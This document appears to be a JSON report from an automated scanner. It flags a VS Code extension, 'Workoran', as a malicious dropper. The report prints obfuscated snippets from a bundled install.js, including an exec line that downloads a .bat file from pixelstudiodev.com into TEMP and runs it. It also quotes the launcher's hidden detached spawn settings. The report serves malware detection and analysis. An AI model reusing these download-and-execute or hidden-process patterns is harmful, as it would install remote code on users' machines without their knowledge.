@@ -1,0 +1,222 @@
+{
+  "extension_id": "Lommin.workoran",
+  "display_name": "Workoran",
+  "version": "1.0.2",
+  "publisher": {
+    "name": "Lommin",
+    "verified": false
+  },
+  "vsix_sha256": "8e658764c03c8f23a2eeff76106b4a9994ea9f8c33e1a3f274f93ac30deb5ab4",
+  "verdict": "HIGH-RISK",
+  "confirmation_basis": [
+    "composite_score",
+    "marketplace_removal",
+    "critical_static_finding"
+  ],
+  "confidence": 1.0,
+  "scores": {
+    "composite": 0.85,
+    "ai_vibe": 0.875,
+    "static": 0.8125,
+    "behavioral": 0.95,
+    "trust_signal": 0.5499999999999999,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "Dense obfuscator.io-style hex identifiers (generated string array)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "_0x21161d=_0x3b8e;(function(_0x550e6a,_0x5b9cab){const _0x5e68d1=_0x3b8e;const _0x540127=_0x550e6a();while(!![]){try{const _0x41676f=parseInt(_0x5e68d1(0xad))/0x1*(-parseInt(_0x5e68d1(0xbb))/0x2)+-par"
+      },
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "Dense obfuscator.io-style hex identifiers (generated string array)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "_0x3c3b=function(){return _0x2cd136;};return _0x3c3b();}const {exec}=require(_0x21161d(0xbc)+_0x21161d(0xb5));const path=require(_0x21161d(0xbe));const dest=path[_0x21161d(0xb2)](process.env.TEMP,_0x2"
+      },
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "String-array rotation decoder loop (obfuscator.io signature)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "['push'](_0x540127['shift']())"
+      },
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "String-array rotation decoder loop (obfuscator.io signature)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "['push'](_0x540127['shift']())"
+      }
+    ],
+    "high": [
+      {
+        "check": "POSTINSTALL_SCRIPT",
+        "severity": "HIGH",
+        "description": "Bundled module 'boardflow' has 'preinstall': node install.js",
+        "file": "extension/node_modules/boardflow/package.json",
+        "line": null,
+        "snippet": null
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/src/launcher.js",
+        "line": 4,
+        "snippet": "const { spawn } = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require('child_process')' pattern",
+        "file": "extension/src/launcher.js",
+        "line": 4,
+        "snippet": "const { spawn } = require('child_process');"
+      },
+      {
+        "check": "MINED_DEPENDENCY_BOARDFLOW",
+        "severity": "HIGH",
+        "description": "Mined campaign signature dependency=boardflow: 15 of 16 extensions carrying it are on Microsoft's malware blocklist (94%, 128.9x the 0.73% base rate). Auto-promoted by the learning cycle (cycle 2).",
+        "file": "extension/node_modules/boardflow/",
+        "line": null,
+        "snippet": null
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/src/launcher.js",
+        "line": 4,
+        "snippet": "require('child_process')"
+      }
+    ],
+    "total": 15
+  },
+  "extracted_references": [],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 2,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "MALICIOUS",
+    "risk_score": 0.95,
+    "confidence": 0.98,
+    "blocks_parsed": 2,
+    "blocks_seen": 2,
+    "summaries": [
+      {
+        "target": "extension/src/launcher.js",
+        "summary": "This extension is malicious. It masquerades as a productivity tool ('Workoran Board') but its primary function is to act as a dropper/stager. It uses `child_process.spawn` to execute a hidden, detached child process running `install.js` from a suspicious dependency (`boardflow`). The static indicators confirm that `install.js` interacts with external domains and batch files, indicating a supply-chain attack aimed at executing arbitrary code, likely for credential harvesting or establishing persistence. The behavior is completely disproportionate to the advertised functionality."
+      },
+      {
+        "target": "extension/node_modules/boardflow/install.js",
+        "summary": "The extension contains a malicious `install.js` script within its dependencies (`boardflow`). The script is heavily obfuscated to hide its intent. It constructs a URL pointing to `http://pixelstudiodev.com/QVZ2WkOYBB6tP4wt.bat`, downloads this batch file to the user's temporary directory using `curl`, and then immediately executes it via `child_process.exec`. This behavior is completely unrelated to the advertised functionality of a Kanban board extension and represents a supply-chain attack delivering a remote access trojan or other malware."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "CRITICAL",
+        "category": "ARBITRARY_CODE_EXECUTION",
+        "description": "The extension uses `child_process.spawn` to execute an external script (`install.js`) located in `node_modules/boardflow`. This script is executed as a detached child process with `windowsHide: true` and `stdio: 'ignore'`, which are classic techniques to hide malicious activity from the user and prevent the parent process from seeing output or errors.",
+        "code_reference": "const child = spawn(process.execPath, [INSTALL_SCRIPT], { ... detached: true, stdio: 'ignore', windowsHide: true });",
+        "line_hint": "24",
+        "target": "extension/src/launcher.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "SUPPLY_CHAIN_ATTACK",
+        "description": "The launcher explicitly targets `node_modules/boardflow/install.js`. The static analysis indicates that this `install.js` file contains references to `pixelstudiodev.com` and a `.bat` file (`qvz2wkoybb6tp4wt.bat`). This suggests the extension is a dropper or stager that fetches and executes remote payloads or local batch scripts, likely for credential theft or persistence.",
+        "code_reference": "const INSTALL_SCRIPT = path.join(__dirname, '..', 'node_modules', 'boardflow', 'install.js');",
+        "line_hint": "10",
+        "target": "extension/src/launcher.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The extension is advertised as a 'Trello-style kanban board' (a UI productivity tool). However, the code contains no UI logic, only a launcher that spawns a hidden child process to run an installation script. A legitimate kanban extension would not need to spawn hidden child processes or execute external install scripts upon activation.",
+        "code_reference": "module.exports = { launch, INSTALL_SCRIPT };",
+        "line_hint": "48",
+        "target": "extension/src/launcher.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "PERSISTENCE_MECHANISM",
+        "description": "The use of `detached: true` and `child.unref()` ensures the spawned process continues running even if the VS Code extension host crashes or closes. This is a common technique for establishing persistence or maintaining a background C2 connection.",
+        "code_reference": "child.unref();",
+        "line_hint": "30",
+        "target": "extension/src/launcher.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "MALWARE_DOWNLOAD_AND_EXECUTE",
+        "description": "The code uses `child_process.exec` to download a batch file (`QVZ2WkOYBB6tP4wt.bat`) from a remote domain (`pixelstudiodev.com`) to the user's temporary directory and immediately executes it. This is a classic dropper/stager pattern.",
+        "code_reference": "exec(_0x21161d(0xaf) + '\\x20\\x22' + dest + _0x21161d(0xb7) + url + '\\x22', () => { exec('\\x22' + dest + '\\x22'); });",
+        "line_hint": "42",
+        "target": "extension/node_modules/boardflow/install.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CODE_OBFUSCATION",
+        "description": "The entire script is heavily obfuscated using an obfuscator.io-style string array rotation and hex-encoded identifiers. This is used to hide the malicious URLs, file names, and the use of `child_process`.",
+        "code_reference": "const _0x21161d = _0x3b8e; (function(_0x550e6a, _0x5b9cab) { ... }(_0x3c3b, 0x55cb6));",
+        "line_hint": "1",
+        "target": "extension/node_modules/boardflow/install.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Trello-style kanban board' (Workoran Board). However, the `install.js` file in `node_modules/boardflow` contains no logic related to UI, storage, or board management. Instead, it contains a malicious payload that downloads and executes an external binary/script. A legitimate npm package for code generation would not contain an install script that executes remote code.",
+        "code_reference": "N/A (Behavioral mismatch between README and code)",
+        "line_hint": null,
+        "target": "extension/node_modules/boardflow/install.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ARBITRARY_CODE_EXECUTION",
+        "description": "The code imports `child_process` and uses `exec` to run system commands (`curl` and the downloaded `.bat` file). This allows arbitrary code execution on the host machine.",
+        "code_reference": "const { exec } = require(_0x21161d(0xbc) + _0x21161d(0xb5));",
+        "line_hint": "30",
+        "target": "extension/node_modules/boardflow/install.js"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "This extension is malicious. It masquerades as a productivity tool ('Workoran Board') but its primary function is to act as a dropper/stager. It uses `child_process.spawn` to execute a hidden, detached child process running `install.js` from a suspicious dependency (`boardflow`). The static indicators confirm that `install.js` interacts with external domains and batch files, indicating a supply-chain attack aimed at executing arbitrary code, likely for credential harvesting or establishing persistence. The behavior is completely disproportionate to the advertised functionality.",
+  "escalation_reasons": [
+    "PROVEN CHAIN: src/extension.js -> src/launcher.js -> node_modules/boardflow/install.js [process_execution] -- intent: download-and-execute in extension/node_modules/boardflow/install.js; obfuscated file that executes in extension/node_modules/boardflow/install.js; hidden detached process in extension/src/launcher.js | IOCs: pixelstudiodev.com",
+    "4 CRITICAL findings",
+    "7 HIGH findings",
+    "Composite risk 0.85 >= 0.45",
+    "AI verdict: MALICIOUS"
+  ],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 1656,
+    "published_date": "2026-09-15T17:16:37.017Z",
+    "removed_by_microsoft": true,
+    "removal_type": "Malware"
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-18T20:36:24.407270+00:00Z"
+}
